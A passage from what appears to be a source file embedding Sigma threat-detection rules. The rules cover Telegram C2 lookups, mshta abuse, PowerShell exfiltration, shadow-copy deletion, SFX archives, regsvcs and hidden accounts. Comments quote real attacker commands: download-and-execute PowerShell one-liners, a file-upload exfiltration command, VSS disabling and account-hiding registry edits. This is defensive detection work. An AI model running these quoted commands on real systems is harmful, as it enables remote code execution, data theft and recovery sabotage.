tags:
  - attack.t1567
  - attack.exfiltration
  - attack.command_and_control
  - attack.t1071.001
author: SOC Prime Team
logsource:
  product: windows
  category: dns_query
detection:
  selection:
    Image|endswith: '.exe'
    QueryName:
      - 'telegram.me' # https://www.pointwild.com/threat-intelligence/inside-vidar-2026-from-infection-to-memory-execution-via-jpeg-and-txt-payloads/; https://www.levelblue.com/blogs/spiderlabs-blog/unmasking-a-multi-stage-loader-autoit-abuse-leading-to-vidar-stealer-command-and-control-communication; https://meltedinhex.com/posts/clickfix-errtraffic-blockchain-c2/; https://www.picussecurity.com/resource/blog/vidar-malware-how-the-multithreaded-windows-stealer-works
      - 't.me' #https://cyble.com/blog/professional-networks-under-attack-by-infostealer/; https://www.netskope.com/blog/openclaw-hologram-fake-installer-ships-rust-infostealer; https://www.vmray.com/execution-level-analysis-of-a-russian-speaking-multi-operator-intrusion-campaign-operation-standoff/; https://research.checkpoint.com/2026/tricks-from-the-past-deployed-via-signed-chatgpt-and-claude-binaries/
      - 'api.telegram.org' # api.telegram.org sendDocument https://www.welivesecurity.com/en/eset-research/gorbag-orcs-border-harvesting-intelligence-ukraine/; api.telegram.org https://www.zscaler.com/blogs/security-research/suspected-tradertraitor-group-uses-trojanized-terraform-provider-deliver; Possible telegram abuse as C2 channel.; https://cert.gov.ua/article/6285731;https://www.sentinelone.com/blog/cybervolk-returns-flawed-volklocker-brings-new-features-with-growing-pains/; https://www.huntress.com/blog/w2-malvertising-to-kernel-mode-edr-kill; https://labs.k7computing.com/index.php/resoker-a-telegram-based-remote-access-trojan/; https://research.jfrog.com/post/solana-fakefix/; https://www.zscaler.com/blogs/security-research/targeted-attack-government-entities-middle-east-part-1; https://www.jumpsec.com/guides/inside-a-dprk-bluenoroff-clickfix-kit/; https://www.rapid7.com/blog/post/tr-operation-asterix-crypto-fraud-vishing-phishing/
      - 'telegra.ph' #Threat actors use Telegraph to store C&C addresses; https://www.malwarebytes.com/blog/threat-intel/2026/08/tracking-pavinloader-across-clickfix-and-fake-download-campaigns
  filters:
    - Image|endswith:
      - 'telegram.exe' # Telegram Desktop
      - 'chrome.exe'
      - 'msedge.exe'
      - 'firefox.exe'
      - 'opera.exe'
      - 'brave.exe'
    - Image|contains|all:
      - '\Program'
      - 'Files'
  condition: selection and not filters
falsepositives:
  - Legitimate domain communication using rare browsers/third party software.
level: medium
"#,
  // Possible VSS Service Autostart Disabled (via cmdline)
  "928c324e-933e-4e87-9538-362e91137e6d": r#"title: Possible VSS Service Autostart Disabled (via cmdline)
id: 928c324e-933e-4e87-9538-362e91137e6d
status: stable
description: Adversaries may try to disable Volume Shadow Copy Service on the compromised host.
references:
    - https://hunt.io/blog/thegentlemen-ransomware-toolkit-russian-proton66-server
author: SOC Prime Team
tags:
    - attack.impact
    - attack.t1489
logsource:
    category: process_creation
    product: windows
detection:
    selection:
        Image|endswith: 'sc.exe'
        CommandLine|contains|all:
          - 'config' # sc config vss start= disabled
          - 'vss'
          - 'start='
          - 'disabled'
    condition: selection
falsepositives:
    - Unknown
level: high
"#,
  // Suspicious Mshta Execution Without HTA File (via cmdline)
  "9387fadc-274f-4326-94f3-cf2eaa539096": r#"title: Suspicious Mshta Execution Without HTA File (via cmdline)
id: 9387fadc-274f-4326-94f3-cf2eaa539096
description: This rule detects the execution of non-.hta files by the mshta.exe binary, which may serve as an indicator of malicious activity.
status: stable
references:
  - https://www.malware-traffic-analysis.net/2026/07/31/index.html
  - https://www.reliaquest.com/blog/threat-spotlight-cyber-attacker-techniques-dec-2024-to-feb-2025/
  - https://cert.gov.ua/article/6282536
  - https://www.recordedfuture.com/research/bluealpha-abuses-cloudflare-tunneling-service
  - https://cert.gov.ua/article/6280129
  - https://cert.gov.ua/article/5661411
  - https://cert.gov.ua/article/4697016
  - https://redcanary.com/blog/intelligence-insights-december-2021/
  - https://www.seqrite.com/blog/sidecopys-multi-platform-onslaught-leveraging-winrar-zero-day-and-linux-variant-of-ares-rat/
  - https://asec.ahnlab.com/en/58919/
  - https://cyble.com/blog/threat-actor-targets-manufacturing-industry-with-malware/
  - https://www.forcepoint.com/blog/x-labs/xworm-malware-targets-united-kingdom-hospitality-sector
  - https://any.run/cybersecurity-blog/manufacturing-companies-targeted-with-lumma/
  - https://medium.com/trac-labs/peaklight-illuminating-the-shadows-02a1bb44885c
  - https://neonprimetime.blogspot.com/2025/01/cloudlfare-captcha-netsupport-rat.html
  - https://www.esentire.com/security-advisories/netsupport-rat-clickfix-distribution
  - https://www.cloudsek.com/blog/lumma-stealer-chronicles-pdf-themed-campaign-using-compromised-educational-institutions-infrastructure
  - https://labs.k7computing.com/index.php/tracking-emmenhtal/
  - https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/resurgence-of-a-fake-captcha-malware-campaign/
  - https://blog.sekoia.io/clearfakes-new-widespread-variant-increased-web3-exploitation-for-malware-delivery/
  - https://www.fortinet.com/blog/threat-research/rolandskimmer-silent-credit-card-thief-uncovered
  - https://www.security.com/threat-intelligence/shuckworm-ukraine-gammasteel
  - https://www.cybereason.com/blog/threat-analysis-lummastealer-2.0
  - https://www.picussecurity.com/resource/blog/lumma-infostealer-continues-its-github-social-engineering-campaign
  - https://thedfirreport.com/2025/05/19/another-confluence-bites-the-dust-falling-to-elpaco-team-ransomware/
  - https://www.netskope.com/blog/purehvnc-rat-using-fake-high-level-job-offers-from-fashion-and-beauty-brands
  - https://www.fortinet.com/blog/threat-research/svg-phishing-hits-ukraine-with-amatera-stealer-pureminer
  - https://www.trellix.com/blogs/research/sidewinders-shifting-sands-click-once-for-espionage/
  - https://blog.talosintelligence.com/uncovering-qilin-attack-methods-exposed-through-multiple-cases/
  - https://www.trendmicro.com/en_us/research/25/k/lumma-stealer-browser-fingerprinting.html
  - https://isc.sans.edu/diary/rss/32474
  - https://www.huntress.com/blog/clickfix-malware-buried-in-images
  - https://www.morphisec.com/blog/pystorerat-a-new-ai-driven-supply-chain-malware-campaign-targeting-it-osint-professionals/
  - https://www.bluevoyant.com/blog/augmented-marauders-multi-pronged-casbaneiro-campaigns
author: SOC Prime Team
tags:
  - attack.defense_evasion
  - attack.t1218.005
logsource:
  product: windows
  category: process_creation
detection:
  selection:
    ParentImage|endswith:
      - '.exe'
      - '.tmp'
      - '.src'
    Image|endswith: 'mshta.exe'
  filters:
    CommandLine|contains: '.hta' #%WINDIR%\System32\mshta.exe %PROGRAMDATA%\scripts\SoftwareProtectionPlatform; cmd.exe /c start "" "mshta" "%CD%\16872_16_2023_03049.lnk"
  condition: selection and not filters
falsepositives:
  - Unlikely
level: high
"#,
  // Possible Data Exfiltration over WebRequests (via powershell)
  "93ec52aa-776a-4976-8209-bc68321c75b7": r#"title: Possible Data Exfiltration over WebRequests (via powershell)
id: 93ec52aa-776a-4976-8209-bc68321c75b7
status: stable
description: Adversaries can use default PowerShell cmdlets for data exfiltration. To reduce false positives, there is a need to exclude legitimate scripts that are used for legitimate purposes.
references:
    - https://www.air.security/blog-posts/solanacry
    - https://cert.gov.ua/article/6318437
    - https://socket.dev/blog/axios-npm-package-compromised
    - https://cert.gov.ua/article/6286219
    - https://harfanglab.io/insidethelab/hijackloader-abusing-genuine-certificates/
    - https://research.checkpoint.com/2024/magnet-goblin-targets-publicly-facing-servers-using-1-day-vulnerabilities/
    - https://www.zscaler.com/blogs/security-research/statc-stealer-decoding-elusive-malware-threat
    - https://www.picussecurity.com/resource/blog/fog-ransomware-2025-deep-dive-into-ttps
    - https://www.welivesecurity.com/en/eset-research/muddywater-snakes-riverbank/
    - https://asec.ahnlab.com/en/92183/
    - https://www.picussecurity.com/resource/blog/t1059-001-powershell
author: SOC Prime Team
tags:
    - attack.exfiltration
    - attack.t1567
    - attack.execution
    - attack.t1059.001
logsource:
    product: windows
    service: powershell
    definition: 'It is recommended to use the new Script Block Logging of PowerShell v5'
detection:
    selection:
        - ScriptBlockText|contains: '-UseBasicParsing).Content' # (iwr $url -UseBasicParsing).Content https://www.air.security/blog-posts/solanacry
        - ScriptBlockText|contains|all:
            - 'Invoke-WebRequest'
            - '-Method'
            - '-Body'
            - '-Uri' #https://cert.gov.ua/article/6286219; https://socket.dev/blog/axios-npm-package-compromised
        - ScriptBlockText|contains|all:
            - 'Invoke-WebRequest'
            - '-Method'
            #- 'POST' #Invoke-WebRequest -Uri https[:]//topgearmemory[.]com/kdsfedafa/stat?c= -Method POST -InFile C:\Users\\AppData\Local\Temp\\41075.txt -UseDefaultCredentials -UseBasicParsing ; Remove-Item C:\Users\\AppData\Local\Temp\\41075.txt
            - '-InFile'
            - '-UseDefaultCredentials'
        - ScriptBlockText|contains|all:
            - 'iwr' #cmd.exe /c start "" /min powershell -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -Command "iwr -uri 'https://hilarious-trifle-d9182e[.]netlify[].]app/stage1.ps1' -UseBasicParsing | IEX"; https://www.welivesecurity.com/en/eset-research/muddywater-snakes-riverbank/; https://asec.ahnlab.com/en/92183/; https://cert.gov.ua/article/6318437
            - 'UseBasicParsing'
            - 'uri'
        - ScriptBlockText|contains|all:
            - 'iwr' #powershell /w 1 /c "ic -scriptblock $([ScriptBlock]::Create([System.Text.Encoding]::UTF8.getString((iwr hxxp://45[.]200[.]148[.]157:8878/payload.ps1).content)))"; https://www.picussecurity.com/resource/blog/t1059-001-powershell
            - '/w '
            - '/c '
    filters:
        ScriptBlockText|contains:
            - 'slackb.com/error' #Invoke-WebRequest -Uri https://slackb.com/error -Method POST -Headers "@{'X-Slack-Ses-Id' =...
    condition: selection and not filters
falsepositives:
    - slack
    - Administrative scripts.
level: medium
"#,
  // Possible PowerShell Pre-Encryption Prep (RunAs + Recovery Inhibition) (via powershell)
  "991bc36f-3348-4aeb-868a-380294c7fd36": r#"title: Possible PowerShell Pre-Encryption Prep (RunAs + Recovery Inhibition) (via powershell)
id: 991bc36f-3348-4aeb-868a-380294c7fd36
status: stable
author: SOC Prime Team
description: Detects a PowerShell script pattern observed by Talos self-elevation via RunAs (“Test-Admin”) followed by system recovery inhibition.
references:
  - https://blog.talosintelligence.com/byovd-loader-deadlock-ransomware/
  - https://www.picussecurity.com/resource/blog/funksec-raas-operations-hacktivism-meets-cybercrime
  - https://www.picussecurity.com/resource/blog/inside-safepay-analyzing-the-new-centralized-ransomware-group
tags:
  - attack.privilege_escalation
  - attack.t1548.002       # Bypass UAC
  - attack.impact
  - attack.t1490           # Inhibit System Recovery
logsource:
  product: windows
  service: powershell
detection:
  elevate:
    ScriptBlockText|contains: '-Verb RunAs' # The article notes the script also disables protections and deletes shadow copies.
  recovery_terms:
    ScriptBlockText|contains:
      - 'vssadmin Delete Shadows'
      - 'wmic shadowcopy delete'
      - 'Disable-RealtimeMonitoring'
      - 'wevtutil sl'
  condition: elevate and recovery_terms
falsepositives:
  - Admin automation that legitimately elevates and manages recovery; validate signer and source path.
level: high
"#,
  // Possible Self-Extracting Archive was Executed (via file_event)
  "9d3c0f31-8fa0-4ebe-ad3f-65cff1e9fb31": r#"title: Possible Self-Extracting Archive was Executed (via file_event)
id: 9d3c0f31-8fa0-4ebe-ad3f-65cff1e9fb31
status: stable
description: Self-extracting archives are executable files that are designed to extract their contents automatically when run. Adversaries may attempt to use self-extracting archives as a way to deliver malicious payloads onto a victim's system. Need to correlate this event with execution events that occurred within the same short timeframe (some_sfx_sample.exe --> file creation with patterts related to SFX).
author: SOC Prime Team
references:
  - https://cert.gov.ua/article/6281202
  - https://www.welivesecurity.com/en/eset-research/cyberespionage-gamaredon-way-analysis-toolset-used-spy-ukraine-2022-2023/
  - https://cert.gov.ua/article/6279600
  - https://cert.gov.ua/article/6279561
  - https://cert.gov.ua/article/6277285
  - https://www.infosecurity-magazine.com/news/signature-techniques-of-asian-apt/
  - https://cert.gov.ua/article/6032734
  - https://cert.gov.ua/article/5269451
  - https://app.any.run/tasks/b27a5ff4-c41b-426c-855c-1f495630dd99
  - https://www.crowdstrike.com/blog/self-extracting-archives-decoy-files-and-their-hidden-payloads/
  - https://menshaway.blogspot.com/2021/05/nanocore-malware.html
  - https://menshaway.blogspot.com/2021/03/njrat-malware.html
  - https://blog.talosintelligence.com/gophish-powerrat-dcrat/
tags:
  - attack.execution
  - attack.t1204.002
  - attack.defense_evasion
  - attack.t1027
logsource:
  product: windows
  category: file_event
detection:
  selection:
    TargetFilename|contains: 'tmp_rar_sfx_access_check' # C:\Users\xxx\AppData\Local\Temp\__tmp_rar_sfx_access_check_1089359
  filters:
    - Image|contains|all:
      - 'Temp' #...\AppData\Local\Temp\56F136~1\target.exe
      - 'target.exe'
      - 'AppData'
    - Image|contains|all:
      - 'winrar-'
  condition: selection and not filters
falsepositives:
  - Legitimate self-extracting archives execution, requires further investigation.
level: high
"#,
  // LOLBAS regsvcs (via cmdline)
  "9de37e2f-fef7-4a88-bf2e-e44b5aac9de3": r#"title: LOLBAS regsvcs (via cmdline)
id: 9de37e2f-fef7-4a88-bf2e-e44b5aac9de3
status: stable
description: Detects use of regsvcs as a living off the land technique.
references:
    - https://lolbas-project.github.io/lolbas/Binaries/Regsvcs/
author: SOC Prime Team
tags:
    - attack.defense_evasion
    - attack.execution
    - attack.t1218.009
logsource:
    category: process_creation
    product: windows
detection:
    selection:
        Image|endswith: 'regsvcs.exe'
        CommandLine|contains:
            - '.dll'
            - '.htm'
            - '.txt'
            - '.png'
            - '.jpeg'
            - '.jpg'
            - '.pdf'
            - '.xml'
            - '.doc'
            - '.xls'
            - '.log'
            - '.tmp'
            - '.dat'
            - '.lnk'
    filters:
        CommandLine|contains:
            - '\Program Files'
    condition: selection and not filters
falsepositives:
    - unknown
level: high
"#,
  // UserAccount Hidden via Registry (via registry_event)
  "a5cdc145-e4d3-4b0f-8a56-ddc2850f3cdf": r#"title: UserAccount Hidden via Registry (via registry_event)
id: a5cdc145-e4d3-4b0f-8a56-ddc2850f3cdf
status: stable
description: By adding users to the "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Specialaccounts" registry entry, advesaries can hide accounts created for persistence.
references:
    - https://socradar.io/blog/n0n-ransomware-ai-assisted-extortion/
    - https://asec.ahnlab.com/en/94552/
    - https://michaelkoczwara.medium.com/adversaries-infrastructure-ransomware-groups-apts-and-red-teams-7a6dd761c50e
    - https://gist.github.com/MichaelKoczwara/07a877f3df094cafa876834249817c95#file-anydesk-txt-L19
    - https://thedfirreport.com/2022/07/11/select-xmrig-from-sqlserver/
    - https://www.itprotoday.com/windows-78/how-can-i-display-local-administrator-account-windows-xp-welcome-screen
    - https://asec.ahnlab.com/en/57873/
    - https://thedfirreport.com/2024/01/29/buzzing-on-christmas-eve-trigona-ransomware-in-3-hours/
    - https://www.bitdefender.com/blog/businessinsights/deep-dive-into-unfading-sea-haze-a-new-threat-actor-in-the-south-china-sea/
    - https://www.huntress.com/blog/akira-ransomware-indicators
    - https://www.security.com/threat-intelligence/china-southeast-asia-espionage
author: SOC Prime Team
tags:
    - attack.defense_evasion
    - attack.t1112
    - attack.t1564.002
logsource:
    category: registry_event
    product: windows
detection:
    selection:
        TargetObject|contains|all:
            - 'Software' #REG ADD "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\Userlist" /v Adminv$ /t REG_DWORD /d 0\
            - 'Microsoft'
            - 'CurrentVersion'
            - 'Winlogon'
            - 'SpecialAccounts'
    condition: selection
falsepositives:
    - legitimate local accounts created and added to SpecialAccounts.
level: medium
